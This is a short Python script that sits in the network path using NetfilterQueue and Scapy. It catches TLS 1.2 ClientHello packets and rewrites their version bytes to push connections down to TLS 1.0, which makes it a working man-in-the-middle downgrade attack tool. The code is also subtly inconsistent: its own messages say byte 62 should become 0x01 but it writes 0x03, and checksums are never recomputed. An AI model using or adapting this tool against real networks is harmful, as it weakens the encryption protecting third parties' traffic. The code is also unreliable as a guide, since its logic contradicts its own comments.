#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
#
# Also, thanks to Mike D. for teaching me how to join() to fix
# the bytes for packet.set_payload.
#
# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
# https://tls.ulfheim.net
#

from netfilterqueue import NetfilterQueue
from scapy import *

scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
__builtins__.__dict__.update(scapy_builtins)


nfQueueID         = 0
maxPacketsToStore = 100


def downgradeTLS(packet):
  print("...")
  pkt = IP(packet.get_payload())

  # Quick test to see if I can read any-thing at all.                     
  if (pkt.haslayer(ICMP)):                                                
    print(pkt.getlayer(ICMP).code)                                        

  if not pkt.haslayer("Raw"):
    packet.accept();

  else:
    tcpPayload = pkt["Raw"].load

    # Adjusted the matching rules for Python 2 and old Scapy.
    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
      print("TLS handshake found, client HELLO.")
      print("-----")
      print(pkt.getlayer(IP)) 
      print("-----")
      
      # By testing with these two and adding .len or .cksum we confirm: the layers don't have those.
      # Very very odd! Why would there not be a cksum or len??
      #print(pkt.getlayer(IP).len)
      #print(pkt.getlayer(TCP).len)
      
      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
        print("TLS v1.2, dropping down to v1.0")
        msgBytes = packet.get_payload()        # msgBytes is read-only, copy it
        msgBytes2 = [b for b in msgBytes]

        print("msgB is: ", type(msgBytes))
        print("msgB2 is: ", type(msgBytes2))
        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")
        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")

        msgBytes2[61] = '\x03'
        msgBytes2[62] = '\x03'

        print("Byte 61 is now: ", msgBytes2[61], ".")
        print("Byte 62 is now: ", msgBytes2[62], ".")

        msg=b''.join(msgBytes2)
        packet.set_payload(msg)

      packet.accept()                                                                     
    else:                                                                              
      packet.accept();


print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, downgradeTLS, maxPacketsToStore) # binds to queue 0, use handler "downgradeTLS()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

